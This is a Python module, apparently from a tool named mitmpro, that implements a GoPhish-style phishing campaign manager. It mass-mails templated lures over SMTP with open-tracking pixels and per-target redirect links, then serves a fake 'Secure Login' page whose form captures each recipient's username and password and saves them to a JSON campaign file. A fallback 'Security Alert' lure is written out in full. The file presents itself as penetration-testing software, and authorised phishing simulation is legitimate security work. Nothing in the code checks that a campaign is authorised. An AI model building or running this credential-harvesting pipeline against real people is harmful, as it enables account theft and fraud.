"""Campaign Manager — GoPhish-style phishing campaign tracking + reporting.

Provides professional campaign management:
  - Campaign creation with targets, templates, and landing pages
  - Real-time tracking (sent, opened, clicked, credentials captured)
  - AI-generated reports with recommendations
  - Campaign history with JSON persistence
  - Integration with the masquerading panel for landing pages
"""
import os
import sys
import time
import json
import uuid
import base64
import threading
import urllib.parse
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog

from mitmpro import common
from mitmpro.ai_components import AIHelperTab
from mitmpro.email_engineer_panel import BUILTIN_TEMPLATES
from mitmpro import logger

OUTPUT_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

CAMPAIGNS_DIR = os.path.join(OUTPUT_DIR, "campaigns")
os.makedirs(CAMPAIGNS_DIR, exist_ok=True)

CAMPAIGNS_FILE = os.path.join(CAMPAIGNS_DIR, "campaigns.json")
TARGETS_DIR = os.path.join(CAMPAIGNS_DIR, "targets")
os.makedirs(TARGETS_DIR, exist_ok=True)

TRACKER_PORT = 8099


def _capture_page(cid, email, target):
    """Simple credential-capture page served by the click-tracking endpoint so
    the full open -> click -> capture flow is measurable."""
    return f"""<!doctype html><html><head><meta charset="utf-8">
<title>Secure Login</title></head><body style="font-family:sans-serif">
<h2>Secure Login</h2>
<form method="post" action="/cap/{cid}/{email}">
<input type="hidden" name="target" value="{target}">
<label>Email<br><input type="text" name="username" value="{email}" size="32"></label><br><br>
<label>Password<br><input type="password" name="password" size="32"></label><br><br>
<button type="submit">Sign in</button>
</form></body></html>"""


class _CampaignTracker:
    """Self-contained tracking server for phishing campaigns.

    Provides open tracking (invisible pixel -> 'opened'), click tracking
    (redirect link -> 'clicked') and credential capture (POST -> 'credentials').
    All counters are written back into the owning panel's campaign dict so the
    'Active Campaigns' view and reports reflect real-time activity.
    """

    def __init__(self, panel, port=TRACKER_PORT):
        self.panel = panel
        self.port = port
        self._lock = threading.Lock()
        self._server = None
        self._thread = None

    def _camp(self, cid):
        for c in self.panel._campaigns:
            if c["id"] == cid:
                return c
        return None

    def _bump(self, cid, key, email=None):
        with self._lock:
            c = self._camp(cid)
            if not c:
                return
            c.setdefault("stats", {})
            c["stats"][key] = c["stats"].get(key, 0) + 1
            if email:
                c.setdefault("events", []).append(
                    {"type": key, "time": time.time(),
                     "detail": urllib.parse.unquote(email)})
        try:
            self.panel._save_campaigns()
            self.panel.after(0, self.panel._refresh_active)
        except Exception as e:
            logger.log_exception(e, "updating campaign stats in tracker")

    def notify_capture(self, cid, email, data):
        """External hook (e.g. from the masquerading landing-page capture) to
        record captured credentials for a campaign."""
        with self._lock:
            c = self._camp(cid)
            if not c:
                return
            c.setdefault("stats", {})["credentials"] = \
                c.get("stats", {}).get("credentials", 0) + 1
            c.setdefault("captured_creds", []).append(
                {"email": email, "data": data, "time": time.time()})
            c.setdefault("events", []).append(
                {"type": "credentials", "time": time.time(), "detail": email})
        try:
            self.panel._save_campaigns()
            self.panel.after(0, self.panel._refresh_active)
        except Exception as e:
            logger.log_exception(e, "updating campaign stats in tracker")

    def start(self):
        if self._server is not None:
            return
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        tracker = self

        class _Handler(BaseHTTPRequestHandler):
            def log_message(self, *a, **k):
                pass

            def _send(self, code, body=b"", ctype="text/html"):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                if ctype.startswith("image/"):
                    self.send_header("Cache-Control", "no-store")
                self.end_headers()
                if body:
                    self.wfile.write(body)

            def do_GET(self):
                p = urllib.parse.urlparse(self.path)
                parts = [x for x in p.path.split("/") if x]
                if len(parts) >= 3 and parts[0] == "px":
                    tracker._bump(parts[1], "opened", parts[2])
                    pixel = base64.b64decode(
                        "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
                    self._send(200, pixel, "image/gif")
                    return
                if len(parts) >= 3 and parts[0] == "go":
                    tracker._bump(parts[1], "clicked", parts[2])
                    q = urllib.parse.parse_qs(p.query)
                    target = q.get("u", ["http://example.com"])[0] or "http://example.com"
                    html = _capture_page(
                        parts[1], urllib.parse.unquote(parts[2]), target).encode()
                    self._send(200, html, "text/html")
                    return
                self._send(404, b"not found")

            def do_POST(self):
                p = urllib.parse.urlparse(self.path)
                parts = [x for x in p.path.split("/") if x]
                if len(parts) >= 3 and parts[0] == "cap":
                    length = int(self.headers.get("Content-Length", 0) or 0)
                    raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
                    data = {k: (v[0] if isinstance(v, list) and v else v)
                            for k, v in urllib.parse.parse_qs(raw).items()}
                    tracker._bump(parts[1], "credentials", parts[2])
                    with tracker._lock:
                        c = tracker._camp(parts[1])
                        if c is not None:
                            c.setdefault("captured_creds", []).append(
                                {"email": urllib.parse.unquote(parts[2]),
                                 "data": data, "time": time.time()})
                            tracker.panel._save_campaigns()
                    self._send(200, b"<html><body>Thank you.</body></html>")
                    return
                self._send(404, b"not found")

        try:
            self._server = ThreadingHTTPServer(("0.0.0.0", self.port), _Handler)
        except Exception:
            self._server = None
            return
        self._thread = threading.Thread(
            target=self._server.serve_forever, daemon=True)
        self._thread.start()



class CampaignManager(ttk.Notebook):
    """Full-featured campaign management panel with target management,
    tracking, AI-powered reporting, and campaign history."""

    def __init__(self, master):
        super().__init__(master)

        self.main_frame = ttk.Frame(self)
        self.add(self.main_frame, text="Campaigns")
        self.add(AIHelperTab(self, "Campaign Manager"), text="AI Helper")

        self._campaigns = []
        self._load_campaigns()
        self._tracker = _CampaignTracker(self)

        self.main_frame.columnconfigure(0, weight=1)
        self.main_frame.rowconfigure(1, weight=1)

        self._build_ui()
        self._refresh_campaign_list()
        self._refresh_active()

    def _build_ui(self):
        nb = ttk.Notebook(self.main_frame)
        nb.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=4, pady=4)
        self.main_frame.rowconfigure(0, weight=1)

        # ---- Tab 1: Create Campaign ----
        create_frame = ttk.Frame(nb)
        nb.add(create_frame, text="  Create Campaign  ")
        create_frame.columnconfigure(1, weight=1)
        create_frame.rowconfigure(3, weight=1)

        create_top = ttk.LabelFrame(create_frame, text="Campaign Details")
        create_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        create_top.columnconfigure(1, weight=1)

        ttk.Label(create_top, text="Campaign Name:").grid(
            row=0, column=0, sticky="w", padx=4)
        self.camp_name = ttk.Entry(create_top)
        self.camp_name.grid(row=0, column=1, sticky="ew", padx=4, pady=2)
        self.camp_name.insert(0, f"Campaign_{datetime.now().strftime('%Y%m%d_%H%M')}")

        ttk.Label(create_top, text="Description:").grid(
            row=1, column=0, sticky="w", padx=4)
        self.camp_desc = ttk.Entry(create_top)
        self.camp_desc.grid(row=1, column=1, sticky="ew", padx=4, pady=2)

        ttk.Label(create_top, text="Landing Page:").grid(
            row=2, column=0, sticky="w", padx=4)
        self.camp_landing = ttk.Combobox(create_top, values=["mirror", "template"])
        self.camp_landing.grid(row=2, column=1, sticky="w", padx=4, pady=2)
        self.camp_landing.set("mirror")

        ttk.Label(create_top, text="Target URL:").grid(
            row=3, column=0, sticky="w", padx=4)
        self.camp_target_url = ttk.Entry(create_top)
        self.camp_target_url.grid(row=3, column=1, sticky="ew", padx=4, pady=2)
        self.camp_target_url.insert(0, "https://example.com")

        ttk.Label(create_top, text="Email Template:").grid(
            row=4, column=0, sticky="w", padx=4)
        self.camp_email_tpl = ttk.Combobox(
            create_top, values=list(BUILTIN_TEMPLATES.keys()))
        self.camp_email_tpl.grid(row=4, column=1, sticky="w", padx=4, pady=2)
        self.camp_email_tpl.set(next(iter(BUILTIN_TEMPLATES.keys())))

        ttk.Label(create_top, text="SMTP Server:").grid(
            row=5, column=0, sticky="w", padx=4)
        self.camp_smtp = ttk.Entry(create_top)
        self.camp_smtp.grid(row=5, column=1, sticky="ew", padx=4, pady=2)
        self.camp_smtp.insert(0, "")

        ttk.Label(create_top, text="SMTP Port:").grid(
            row=6, column=0, sticky="w", padx=4)
        self.camp_smtp_port = ttk.Entry(create_top, width=10)
        self.camp_smtp_port.grid(row=6, column=1, sticky="w", padx=4, pady=2)
        self.camp_smtp_port.insert(0, "587")

        ttk.Label(create_top, text="SMTP Username:").grid(
            row=7, column=0, sticky="w", padx=4)
        self.camp_smtp_user = ttk.Entry(create_top)
        self.camp_smtp_user.grid(row=7, column=1, sticky="ew", padx=4, pady=2)

        ttk.Label(create_top, text="SMTP Password:").grid(
            row=8, column=0, sticky="w", padx=4)
        self.camp_smtp_pass = ttk.Entry(create_top, show="*")
        self.camp_smtp_pass.grid(row=8, column=1, sticky="ew", padx=4, pady=2)

        ttk.Label(create_top, text="From Email:").grid(
            row=9, column=0, sticky="w", padx=4)
        self.camp_smtp_from = ttk.Entry(create_top)
        self.camp_smtp_from.grid(row=9, column=1, sticky="ew", padx=4, pady=2)

        smtp_opts = ttk.Frame(create_top)
        smtp_opts.grid(row=10, column=0, columnspan=2, sticky="w", padx=4, pady=2)
        self.camp_smtp_tls = tk.BooleanVar(value=True)
        ttk.Checkbutton(smtp_opts, text="Use TLS",
                        variable=self.camp_smtp_tls).pack(side="left", padx=4)

        create_btns = ttk.Frame(create_frame)
        create_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(create_btns, text="Create Campaign",
                   command=self.create_campaign).pack(side="left", padx=4)
        ttk.Button(create_btns, text="Import Targets (CSV)",
                   command=self.import_targets_csv).pack(side="left", padx=4)
        ttk.Button(create_btns, text="Add Target Manually",
                   command=self.add_target_manual).pack(side="left", padx=4)

        # Target list
        target_frame = ttk.LabelFrame(create_frame, text="Targets")
        target_frame.grid(row=2, column=0, sticky="ew", padx=4, pady=4)
        target_frame.columnconfigure(0, weight=1)
        target_frame.rowconfigure(0, weight=1)

        self.target_tree = ttk.Treeview(
            target_frame,
            columns=("Email", "Name", "Status"), show="headings", height=8)
        self.target_tree.heading("Email", text="Email")
        self.target_tree.heading("Name", text="Name")
        self.target_tree.heading("Status", text="Status")
        self.target_tree.column("Email", width=250)
        self.target_tree.column("Name", width=200)
        self.target_tree.column("Status", width=100)
        self.target_tree.grid(row=0, column=0, sticky="nsew")

        tgt_scroll = ttk.Scrollbar(
            target_frame, orient="vertical", command=self.target_tree.yview)
        self.target_tree.configure(yscrollcommand=tgt_scroll.set)
        tgt_scroll.grid(row=0, column=1, sticky="ns")

        tgt_btns = ttk.Frame(target_frame)
        tgt_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(tgt_btns, text="Remove Selected",
                   command=self.remove_selected_target).pack(side="left", padx=4)
        ttk.Button(tgt_btns, text="Clear All",
                   command=lambda: self.target_tree.delete(
                       *self.target_tree.get_children())).pack(side="left", padx=4)

        # ---- Tab 2: Active Campaigns ----
        active_frame = ttk.Frame(nb)
        nb.add(active_frame, text="  Active Campaigns  ")
        active_frame.columnconfigure(0, weight=1)
        active_frame.rowconfigure(1, weight=1)

        self.active_tree = ttk.Treeview(
            active_frame,
            columns=("ID", "Name", "Targets", "Sent", "Opened",
                     "Clicked", "Captured", "Status"),
            show="headings", height=8)
        for col in ("ID", "Name", "Targets", "Sent", "Opened",
                     "Clicked", "Captured", "Status"):
            self.active_tree.heading(col, text=col)
            self.active_tree.column(col, width=100)
        self.active_tree.column("Name", width=200)
        self.active_tree.column("ID", width=120)
        self.active_tree.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)

        act_scroll = ttk.Scrollbar(
            active_frame, orient="vertical", command=self.active_tree.yview)
        self.active_tree.configure(yscrollcommand=act_scroll.set)
        act_scroll.grid(row=0, column=1, sticky="ns")

        act_btns = ttk.Frame(active_frame)
        act_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(act_btns, text="Launch Selected",
                   command=self.launch_campaign).pack(side="left", padx=4)
        ttk.Button(act_btns, text="Stop Selected",
                   command=self.stop_campaign).pack(side="left", padx=4)
        ttk.Button(act_btns, text="View Report",
                   command=self.view_report).pack(side="left", padx=4)
        ttk.Button(act_btns, text="Export Report",
                   command=self.export_report).pack(side="left", padx=4)
        ttk.Button(act_btns, text="Refresh",
                   command=self._refresh_active).pack(side="left", padx=4)

        # ---- Tab 3: Reports ----
        report_frame = ttk.Frame(nb)
        nb.add(report_frame, text="  Reports  ")
        report_frame.columnconfigure(0, weight=1)
        report_frame.rowconfigure(1, weight=1)

        report_top = ttk.Frame(report_frame)
        report_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        ttk.Label(report_top, text="Campaign:").pack(side="left", padx=4)
        self.report_camp = ttk.Combobox(report_top, width=30)
        self.report_camp.pack(side="left", padx=4)
        ttk.Button(report_top, text="Generate AI Report",
                   command=self.generate_ai_report).pack(side="left", padx=4)
        ttk.Button(report_top, text="Export JSON",
                   command=self.export_report_json).pack(side="left", padx=4)

        self.report_text = scrolledtext.ScrolledText(
            report_frame, height=20, font=("Courier", 10))
        self.report_text.grid(row=1, column=0, sticky="nsew", padx=4, pady=4)

    # -------------------------------------------------------- Target Management
    def import_targets_csv(self, **kwargs):
        path = filedialog.askopenfilename(
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")])
        if not path:
            return
        try:
            import csv
            count = 0
            with open(path, "r", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    email = row.get("email") or row.get("Email") or ""
                    name = row.get("name") or row.get("Name") or ""
                    if email.strip():
                        self.target_tree.insert(
                            "", "end",
                            values=(email.strip(), name.strip(), "new"))
                        count += 1
            messagebox.showinfo("Imported", f"Imported {count} targets.")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def add_target_manual(self, **kwargs):
        dialog = _TargetDialog(self.winfo_toplevel())
        self.winfo_toplevel().wait_window(dialog.top)
        if dialog.result:
            email, name = dialog.result
            self.target_tree.insert(
                "", "end", values=(email, name, "new"))

    def remove_selected_target(self, **kwargs):
        sel = self.target_tree.selection()
        for item in sel:
            self.target_tree.delete(item)

    # -------------------------------------------------------- Campaign CRUD
    def create_campaign(self, **kwargs):
        name = self.camp_name.get().strip()
        if not name:
            messagebox.showerror("Error", "Enter a campaign name.")
            return

        targets = []
        for item in self.target_tree.get_children():
            vals = self.target_tree.item(item, "values")
            targets.append({
                "email": vals[0], "name": vals[1], "status": vals[2]
            })

        if not targets:
            if not messagebox.askyesno(
                    "No targets",
                    "No targets added. Create campaign anyway?"):
                return

        campaign = {
            "id": uuid.uuid4().hex[:12],
            "name": name,
            "description": self.camp_desc.get().strip(),
            "landing_page": self.camp_landing.get().strip(),
            "target_url": self.camp_target_url.get().strip(),
            "email_template": self.camp_email_tpl.get().strip(),
            "smtp_server": self.camp_smtp.get().strip(),
            "smtp_port": self.camp_smtp_port.get().strip(),
            "smtp_user": self.camp_smtp_user.get().strip(),
            "smtp_pass": self.camp_smtp_pass.get().strip(),
            "smtp_from": self.camp_smtp_from.get().strip(),
            "smtp_tls": self.camp_smtp_tls.get(),
            "targets": targets,
            "stats": {
                "total": len(targets),
                "sent": 0, "opened": 0, "clicked": 0,
                "credentials": 0, "reported": 0
            },
            "status": "created",
            "created_at": time.time(),
            "events": []
        }

        self._campaigns.append(campaign)
        self._save_campaigns()
        self._refresh_campaign_list()
        self._refresh_active()
        messagebox.showinfo(
            "Created",
            f"Campaign '{name}' created with {len(targets)} targets.")
        return campaign["id"]

    def _refresh_campaign_list(self):
        names = [c["name"] for c in self._campaigns]
        self.report_camp["values"] = names
        if names:
            self.report_camp.set(names[0])

    def _refresh_active(self):
        self.active_tree.delete(*self.active_tree.get_children())
        for c in self._campaigns:
            s = c.get("stats", {})
            self.active_tree.insert("", "end", values=(
                c["id"], c["name"],
                s.get("total", 0), s.get("sent", 0),
                s.get("opened", 0), s.get("clicked", 0),
                s.get("credentials", 0), c.get("status", "unknown")))

    # -------------------------------------------------------- Launch/Stop
    def launch_campaign(self, camp_id=None, **kwargs):
        programmatic = camp_id is not None
        sel = self.active_tree.selection()
        # Prefer the explicit argument; fall back to the GUI selection
        if sel and not camp_id:
            camp_id = self.active_tree.item(sel[0], "values")[0]
        camp = None
        for c in self._campaigns:
            if c["id"] == camp_id or c["name"] == camp_id:
                camp = c
                break

        if not camp:
            if not programmatic:
                messagebox.showinfo("Select", "Select a campaign first.")
            return "Campaign not found."

        # Check if we have SMTP config
        smtp_host = camp.get("smtp_server", "").strip()
        if not smtp_host:
            msg = "Campaign has no SMTP server configured."
            if not programmatic:
                messagebox.showerror("Error", msg)
            return msg

        # Try to get the EmailEngineer panel to send emails
        app = self.winfo_toplevel()
        email_panel = app.panels.get("email") if hasattr(app, "panels") else None

        camp["status"] = "active"
        camp["stats"]["sent"] = 0
        camp["events"].append({
            "type": "launched",
            "time": time.time(),
            "detail": f"Launched with {len(camp.get('targets', []))} targets"
        })
        self._save_campaigns()
        self._refresh_active()

        # Send emails in background thread
        threading.Thread(
            target=self._send_campaign_emails,
            args=(camp, email_panel),
            daemon=True
        ).start()
        return f"Campaign '{camp['name']}' launched."

    def stop_campaign(self, **kwargs):
        camp_id = kwargs.get("camp_id")
        sel = self.active_tree.selection()
        if sel and not camp_id:
            camp_id = self.active_tree.item(sel[0], "values")[0]
        if not camp_id:
            return
        for c in self._campaigns:
            if c["id"] == camp_id or c["name"] == camp_id:
                c["status"] = "stopped"
                c["events"].append({
                    "type": "stopped", "time": time.time()
                })
                self._save_campaigns()
                self._refresh_active()
                return

    def _send_campaign_emails(self, campaign, email_panel):
        """Send phishing emails for a campaign using SMTP."""
        targets = campaign.get("targets", [])
        if not targets:
            self.after(0, lambda: messagebox.showinfo("Info", "No targets in campaign."))
            return
        
        smtp_host = campaign.get("smtp_server", "").strip()
        smtp_port = campaign.get("smtp_port", "587").strip()
        smtp_user = campaign.get("smtp_user", "").strip()
        smtp_pass = campaign.get("smtp_pass", "").strip()
        smtp_from = campaign.get("smtp_from", "").strip() or smtp_user
        smtp_tls = campaign.get("smtp_tls", True)
        
        if not smtp_host or not smtp_user or not smtp_pass:
            self.after(0, lambda: messagebox.showerror("Error", "SMTP credentials not configured."))
            campaign["status"] = "error"
            self._save_campaigns()
            self.after(0, self._refresh_active)
            return
        
        # Prepare the tracking base URL (recipient reaches this from their mail
        # client; for local testing 127.0.0.1 is used).
        self._tracker.start()
        track_base = f"http://127.0.0.1:{self._tracker.port}"
        camp_id = campaign["id"]
        subject = ""
        html_body = ""
        text_body = ""
        from_name = ""
        
        if email_panel:
            # Try to get template from email panel
            tpl_name = campaign.get(
                "email_template", next(iter(BUILTIN_TEMPLATES.keys())))
            tpl = email_panel._custom_templates.get(tpl_name)
            if not tpl:
                tpl = BUILTIN_TEMPLATES.get(tpl_name)
            if tpl:
                subject = tpl.get("subject", "")
                html_body = tpl.get("html_body", "")
                text_body = tpl.get("body", "")
                from_name = tpl.get("from_name", "")
        
        if not subject:
            # Fallback
            subject = "Security Alert"
            html_body = "<p>Please verify your account: {phish_link}</p>"
            text_body = "Please verify your account: {phish_link}"
            from_name = "IT Security"
        
        # Get variable values from campaign
        target_url = campaign.get("target_url", "").strip()
        company_name = "Target Company"
        
        sent_count = 0
        failed_count = 0
        
        for target in targets:
            if campaign.get("status") == "stopped":
                break
                
            email = target.get("email", "").strip()
            name = target.get("name", "").strip() or email.split("@")[0]
            
            if not email:
                continue
            
            # Prepare phish link - route through the tracker so clicks are
            # recorded, then land on the configured target/landing page.
            email_enc = urllib.parse.quote(email)
            target_enc = urllib.parse.quote(target_url)
            phish_link = f"{track_base}/go/{camp_id}/{email_enc}?u={target_enc}"
            if not target_url:
                phish_link = f"{track_base}/go/{camp_id}/{email_enc}?u=http://localhost:8080"
            
            # Variable substitution
            vars_map = {
                "{target_name}": name,
                "{target_email}": email,
                "{company_name}": company_name,
                "{phish_link}": phish_link,
                "{sender_name}": from_name,
                "{doc_name}": "Document",
                "{invoice_num}": "INV-001",
                "{due_date}": "2024-12-31",
            }
            
            subj = subject
            html = html_body
            text = text_body
            for var, val in vars_map.items():
                subj = subj.replace(var, val)
                html = html.replace(var, val)
                text = text.replace(var, val)

            # Embed an open-tracking pixel so "opened" is recorded when the
            # recipient renders the HTML email.
            pixel = (f'<img src="{track_base}/px/{camp_id}/{email_enc}" '
                     f'width="1" height="1" alt="">')
            if html and "</body>" in html.lower():
                html = html.replace("</body>", pixel + "</body>", 1)
            elif html:
                html = html + pixel
            
            try:
                msg = MIMEMultipart("alternative")
                msg["Subject"] = subj
                msg["From"] = f"{from_name} <{smtp_from}>"
                msg["To"] = email
                
                if text:
                    msg.attach(MIMEText(text, "plain"))
                if html:
                    msg.attach(MIMEText(html, "html"))
                
                port = int(smtp_port or "587")
                if port == 465:
                    server = smtplib.SMTP_SSL(smtp_host, port, timeout=15)
                elif smtp_tls:
                    server = smtplib.SMTP(smtp_host, port, timeout=15)
                    server.starttls()
                else:
                    server = smtplib.SMTP(smtp_host, port, timeout=15)
                
                server.login(smtp_user, smtp_pass)
                server.sendmail(smtp_from, [email], msg.as_string())
                server.quit()
                
                sent_count += 1
                target["status"] = "sent"
            except Exception as e:
                failed_count += 1
                target["status"] = f"failed: {e}"
            
            # Update stats in real-time
            campaign["stats"]["sent"] = sent_count
            self._save_campaigns()
            self.after(0, self._refresh_active)
            
            # Small delay between emails to avoid rate limiting
            time.sleep(0.5)
        
        campaign["stats"]["sent"] = sent_count
        campaign["events"].append({
            "type": "emails_sent",
            "time": time.time(),
            "detail": f"Sent: {sent_count}, Failed: {failed_count}"
        })
        campaign["status"] = "completed" if failed_count == 0 else "partial"
        self._save_campaigns()
        self.after(0, self._refresh_active)
        self.after(0, lambda: messagebox.showinfo(
            "Campaign Complete",
            f"Campaign '{campaign['name']}' finished.\n"
            f"Sent: {sent_count}, Failed: {failed_count}"))

    # -------------------------------------------------------- Reports
    def view_report(self, camp_name=None, **kwargs):
        programmatic = camp_name is not None
        sel = self.active_tree.selection()
        camp = None
        if sel and not camp_name:
            camp_id = self.active_tree.item(sel[0], "values")[0]
            for c in self._campaigns:
                if c["id"] == camp_id:
                    camp = c
                    break
        else:
            if not camp_name:
                camp_name = self.report_camp.get().strip()
            for c in self._campaigns:
                if c["name"] == camp_name:
                    camp = c
                    break

        if not camp:
            if not programmatic:
                messagebox.showinfo("Select", "Select a campaign.")
            return "Campaign not found."

        self.report_text.delete("1.0", "end")
        s = camp.get("stats", {})
        report = (
            f"{'=' * 60}\n"
            f"CAMPAIGN REPORT: {camp['name']}\n"
            f"{'=' * 60}\n\n"
            f"ID:          {camp['id']}\n"
            f"Status:      {camp.get('status', 'unknown')}\n"
            f"Created:     {time.strftime('%Y-%m-%d %H:%M', time.localtime(camp.get('created_at', 0)))}\n"
            f"Description: {camp.get('description', '')}\n"
            f"Target URL:  {camp.get('target_url', '')}\n"
            f"Landing:     {camp.get('landing_page', '')}\n"
            f"Email Tpl:   {camp.get('email_template', '')}\n\n"
            f"--- Statistics ---\n"
            f"  Total Targets:  {s.get('total', 0)}\n"
            f"  Emails Sent:    {s.get('sent', 0)}\n"
            f"  Page Opened:    {s.get('opened', 0)}\n"
            f"  Links Clicked:  {s.get('clicked', 0)}\n"
            f"  Creds Captured: {s.get('credentials', 0)}\n"
            f"  Reported:       {s.get('reported', 0)}\n\n"
        )

        # Calculate rates
        total = s.get("total", 0) or 1
        opened = s.get("opened", 0)
        clicked = s.get("clicked", 0)
        creds = s.get("credentials", 0)

        report += (
            f"--- Conversion Rates ---\n"
            f"  Open Rate:     {opened / total * 100:.1f}%\n"
            f"  Click Rate:    {clicked / total * 100:.1f}%\n"
            f"  Credential Rate: {creds / total * 100:.1f}%\n\n"
        )

        if camp.get("events"):
            report += "--- Event Log ---\n"
            for ev in camp["events"]:
                ts = time.strftime(
                    "%Y-%m-%d %H:%M:%S",
                    time.localtime(ev.get("time", 0)))
                report += f"  [{ts}] {ev.get('type', '')}: {ev.get('detail', '')}\n"

        self.report_text.insert("1.0", report)
        return report

    def generate_ai_report(self, **kwargs):
        camp_name = self.report_camp.get().strip()
        camp = None
        for c in self._campaigns:
            if c["name"] == camp_name:
                camp = c
                break

        if not camp:
            messagebox.showinfo("Select", "Select a campaign.")
            return

        model = common.SELECTED_MODEL
        if not model:
            models = common.ollama_models()
            if models:
                model = models[0]
            else:
                messagebox.showinfo(
                    "No AI", "No Ollama model available.")
                return

        import mitmpro.ai_core as ai_core
        s = camp.get("stats", {})
        prompt = (
            f"Generate a professional penetration testing report for this "
            f"phishing campaign:\n\n"
            f"Campaign: {camp['name']}\n"
            f"Targets: {s.get('total', 0)}\n"
            f"Sent: {s.get('sent', 0)}\n"
            f"Opened: {s.get('opened', 0)}\n"
            f"Clicked: {s.get('clicked', 0)}\n"
            f"Credentials: {s.get('credentials', 0)}\n"
            f"Reported: {s.get('reported', 0)}\n\n"
            f"Include: executive summary, technical findings, risk "
            f"ratings, recommendations, and compliance notes.")

        messages = [
            {"role": "system", "content": (
                "You are a senior penetration tester generating a "
                "professional phishing campaign report. Be thorough "
                "and include risk ratings (Critical/High/Medium/Low).")},
            {"role": "user", "content": prompt}
        ]

        self.report_text.delete("1.0", "end")
        self.report_text.insert("1.0", "Generating AI report...\n")

        def _run():
            collected = {"text": ""}

            def on_token(t):
                collected["text"] += t
                try:
                    self.after(0, lambda: (
                        self.report_text.delete("1.0", "end"),
                        self.report_text.insert("1.0", collected["text"])))
                except Exception:
                    pass

            ai_core.stream_chat(model, messages, on_token=on_token,
                                context="Campaign Report")
            try:
                self.after(0, lambda: (
                    self.report_text.delete("1.0", "end"),
                    self.report_text.insert("1.0", collected["text"])))
            except Exception:
                pass

        threading.Thread(target=_run, daemon=True).start()

    def export_report(self, **kwargs):
        return self.export_report_json(**kwargs)

    def export_report_json(self, camp_name=None, path=None, **kwargs):
        programmatic = camp_name is not None or path is not None
        if not camp_name:
            camp_name = self.report_camp.get().strip()
        camp = None
        for c in self._campaigns:
            if c["name"] == camp_name:
                camp = c
                break
        if not camp:
            return "Campaign not found."

        if not path:
            path = filedialog.asksaveasfilename(
                defaultextension=".json",
                initialfile=f"report_{camp['id']}.json",
                filetypes=[("JSON files", "*.json")])
        if not path:
            return "No path selected."
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(camp, f, indent=2, default=str)
            if not programmatic:
                messagebox.showinfo("Exported", f"Report saved to {path}")
            return path
        except Exception as e:
            if not programmatic:
                messagebox.showerror("Error", str(e))
            return f"Error: {e}"

    # -------------------------------------------------------- Persistence
    def _load_campaigns(self):
        try:
            if os.path.isfile(CAMPAIGNS_FILE):
                with open(CAMPAIGNS_FILE, "r", encoding="utf-8") as f:
                    self._campaigns = json.load(f)
        except (OSError, json.JSONDecodeError):
            self._campaigns = []

    def _save_campaigns(self):
        try:
            with open(CAMPAIGNS_FILE, "w", encoding="utf-8") as f:
                json.dump(self._campaigns, f, indent=2, default=str)
        except Exception as e:
            logger.log_exception(e, "saving campaigns")


class _TargetDialog:
    """Simple dialog to add a target manually."""

    def __init__(self, parent):
        self.result = None
        self.top = tk.Toplevel(parent)
        self.top.title("Add Target")
        self.top.geometry("400x150")
        self.top.configure(bg="#0d1117")
        self.top.transient(parent)
        self.top.grab_set()

        ttk.Label(self.top, text="Email:").grid(
            row=0, column=0, sticky="w", padx=10, pady=8)
        self.email = ttk.Entry(self.top, width=35)
        self.email.grid(row=0, column=1, padx=10, pady=8)

        ttk.Label(self.top, text="Name:").grid(
            row=1, column=0, sticky="w", padx=10, pady=8)
        self.name = ttk.Entry(self.top, width=35)
        self.name.grid(row=1, column=1, padx=10, pady=8)

        btns = ttk.Frame(self.top)
        btns.grid(row=2, column=0, columnspan=2, pady=10)
        ttk.Button(btns, text="Add", command=self._ok).pack(side="left", padx=10)
        ttk.Button(btns, text="Cancel", command=self._cancel).pack(
            side="left", padx=10)

    def _ok(self):
        e = self.email.get().strip()
        if e:
            self.result = (e, self.name.get().strip())
        self.top.destroy()

    def _cancel(self):
        self.top.destroy()
